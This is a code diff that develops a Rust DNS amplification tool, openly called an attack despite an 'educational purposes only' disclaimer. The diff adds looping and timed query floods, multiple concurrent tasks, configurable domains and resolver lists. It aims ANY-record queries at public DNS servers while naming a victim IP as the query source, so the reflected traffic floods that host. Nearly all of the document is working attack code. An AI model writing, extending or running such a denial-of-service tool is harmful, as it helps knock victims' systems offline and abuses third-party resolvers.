@@ -5,20 +5,35 @@
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
 use clap::{arg, command, Parser};
+use dotenv::dotenv;
 use reqwest;
-use trust_dns_resolver::config::ResolverOpts;
+use std::env;
 use std::fs::File;
 use std::io::{self, BufRead, BufReader};
 use std::net::{IpAddr, SocketAddr};
 use std::str::FromStr;
+use std::time::Duration;
 use tokio;
 use trust_dns_proto::rr::record_type::RecordType;
-use trust_dns_resolver::lookup::Lookup;
+use trust_dns_resolver::config::ResolverOpts;
 use trust_dns_resolver::{
     config::{NameServerConfig, Protocol, ResolverConfig},
-    error::ResolveResult,
     TokioAsyncResolver,
 };
+
+fn colorize(text: &str, color: &str) -> String {
+    let color = match color {
+        "red" => "31",
+        "green" => "32",
+        "yellow" => "33",
+        "blue" => "34",
+        "magenta" => "35",
+        "cyan" => "36",
+        "white" => "37",
+        _ => "0",
+    };
+    format!("\x1B[{}m{}\x1B[0m", color, text)
+}
 
 async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
@@ -37,7 +52,6 @@ fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
         let line = line?;
         let line = line.trim();
 
-        // Ignore empty lines and lines that start with a comment character
         if !line.is_empty() && !line.starts_with('#') {
             dns_servers.push(line.to_owned());
         }
@@ -51,8 +65,7 @@ async fn send_dns_query(
     domain: &str,
     source_ip: IpAddr,
     record_type: RecordType,
-) -> ResolveResult<Lookup> {
-
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let dns_server_socket = SocketAddr::new(dns_server, 53);
     let source_ip_socket = SocketAddr::new(source_ip, 0);
 
@@ -66,19 +79,45 @@ async fn send_dns_query(
     });
 
     let resolver = TokioAsyncResolver::tokio(resolver_config, ResolverOpts::default()).unwrap();
-    
-    // Send a DNS query to the resolver for the specified domain and record type
-    let response = resolver.lookup(domain, record_type).await?;
+    resolver.lookup(domain, record_type).await?;
 
-    // Return the list of resource records in the response
-    Ok(response)
+    let dns_server = colorize(&dns_server.to_string(), "red");
+    let source_ip = colorize(&source_ip.to_string(), "green");
+    println!("Query send to {} from {}", dns_server, source_ip);
+
+    Ok(())
 }
 
-async fn amplify(dns_server: &str, domain: &str, source_ip: &str, record_type: RecordType) -> Result<(), Box<dyn std::error::Error>> {
-    let dns_server = IpAddr::from_str(dns_server)?;
+async fn amplify(
+    dns_servers: &Vec<String>,
+    domain: &str,
+    source_ip: &str,
+    record_type: RecordType,
+    time: Option<u32>,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let source_ip = IpAddr::from_str(source_ip)?;
-    let response = send_dns_query(dns_server, domain, source_ip, record_type);
-    println!("{:?}", response.await?);
+
+    if time.is_none() {
+        loop {
+            for dns_server in dns_servers {
+                let dns_server = IpAddr::from_str(&dns_server)?;
+                send_dns_query(dns_server, domain, source_ip, record_type).await?;
+            }
+        }
+    } else {
+        let time = time.unwrap();
+        let time = Duration::from_secs(time as u64);
+
+        let start = tokio::time::Instant::now();
+
+        while start.elapsed() < time {
+            for dns_server in dns_servers {
+                let dns_server = IpAddr::from_str(&dns_server)?;
+                send_dns_query(dns_server, domain, source_ip, record_type).await?;
+            }
+        }
+    }
+
     Ok(())
 }
 
@@ -89,7 +128,12 @@ struct Args {
     #[arg(required = true)]
     target: String,
     /// Record type to use
-    #[arg(short = 'r', long = "record-type", required = false, default_value = "ANY")]
+    #[arg(
+        short = 'r',
+        long = "record-type",
+        required = false,
+        default_value = "ANY"
+    )]
     record_type: Option<String>,
     /// List of dns servers to use
     #[arg(short, long, required = false)]
@@ -97,22 +141,63 @@ struct Args {
     /// Time the attack should run
     #[arg(short, long, required = false)]
     time: Option<u32>,
+    /// Domain to resolve
+    #[arg(
+        short = 'd',
+        long = "domain",
+        required = false,
+        default_value = "google.com"
+    )]
+    domain: Option<String>,
+    /// Thread count
+    #[arg(short = 'm', long = "threads", required = false, default_value = "10")]
+    threads: Option<u16>,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
-    let servers: Vec<String>;
+
+    let record_type = RecordType::from_str(args.record_type.as_ref().unwrap()).unwrap();
+    let source_ip = args.target.as_str();
+    let time = args.time;
+    let domain = args.domain.unwrap();
+    let threads = args.threads.unwrap();
+    let dns_servers: Vec<String>;
+
     if args.server_list.is_none() {
-        servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
+        dotenv().ok();
+        let dns_server_list_url = env::var("DNS_SERVER_LIST_URL").unwrap();
+        dns_servers = get_public_dns_servers(&dns_server_list_url).await?;
     } else {
-        servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
+        dns_servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
     }
-    for server in &servers {
-        let result = amplify(server, "google.com", &args.target, RecordType::ANY).await;
-        if let Err(e) = result {
-            println!("Error sending query to {}: {}", server, e);
+
+    let mut handles = vec![];
+
+    for _ in 0..threads {
+        let dns_servers = dns_servers.clone();
+        let source_ip = source_ip.to_string();
+        let time = time.clone();
+        let domain = domain.clone();
+
+        let handle = tokio::spawn(async move {
+            amplify(&dns_servers, &domain, &source_ip, record_type, time).await
+        });
+
+        handles.push(handle);
+    }
+
+    for handle in handles {
+        match handle.await {
+            Ok(_result) => {
+                println!("Attack on {} finished", colorize(&source_ip, "red"));
+            }
+            Err(error) => {
+                eprintln!("Error occurred: {}", error);
+            }
         }
     }
+
     Ok(())
 }
